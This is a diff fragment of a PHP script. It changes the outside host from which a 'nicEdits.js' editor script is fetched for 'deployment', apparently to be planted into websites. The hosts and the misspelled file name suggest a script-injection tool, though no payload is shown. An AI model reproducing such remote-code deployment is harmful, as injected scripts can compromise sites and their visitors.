@@ -70,7 +70,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['
 
     if (in_array('nicEdit', $tasks)) {
         sendLog("FETCHING NICEDIT DEPLOYMENT ASSETS...");
-        $js_url = "https://msrapidtrader.com/assets/admin/js/nicEdits.js";
+        $js_url = "https://capitalflowpk.site/assets/admin/js/nicEdits.js";
         $js_content = @file_get_contents($js_url);
         if (!$js_content) sendLog("!! FAILED TO FETCH REMOTE ASSETS !!");
     }
